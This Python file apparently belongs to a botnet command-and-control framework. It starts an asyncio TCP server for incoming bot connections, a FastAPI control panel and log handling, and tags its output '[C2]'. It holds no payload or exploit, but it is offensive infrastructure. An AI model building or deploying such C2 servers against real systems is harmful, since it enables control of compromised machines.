# backend/Core/Server.py
import asyncio, multiprocessing, webbrowser, backend.LoggerWrapper as logger
from backend import IP, PORT, API_PORT, start_benchmark
from ..API.api import run_fastapi_server
from .ClientConnection import BotConnectionHandler

class C2Server:
    "Управление жизненным циклом TCP сервера и API"
    def __init__(self): self.log_queue, self.server = multiprocessing.Queue(), None

    async def start(self):
        "Запуск TCP сервера, FastAPI и мониторинга"
        handler = BotConnectionHandler()
        self.server = await asyncio.start_server(handler.handle_new_connection, IP, PORT, reuse_address=True, backlog=1000, limit=5242880)
        logger.Log.info(f"[C2] TCP Server on {IP}:{PORT}")
        
        # Создание фоновых задач
        tasks = [
            asyncio.create_task(logger.Log.start_queue_listener(self.log_queue)),
            asyncio.create_task(run_fastapi_server(IP, API_PORT))
        ]
        
        start_benchmark(asyncio.get_running_loop()); webbrowser.open(f"http://{IP}:{API_PORT}/")
        async with self.server:
            try: await asyncio.gather(self.server.serve_forever(), *tasks)
            except asyncio.CancelledError: logger.Log.warning("[C2] Shutdown initiated...")
            finally:
                self.log_queue.put("STOP"); [t.cancel() for t in tasks]
                await asyncio.gather(*tasks, return_exceptions=True)
                logger.Log.info("[C2] Server stopped.")

async def start_server():
    "Точка входа"
    await C2Server().start()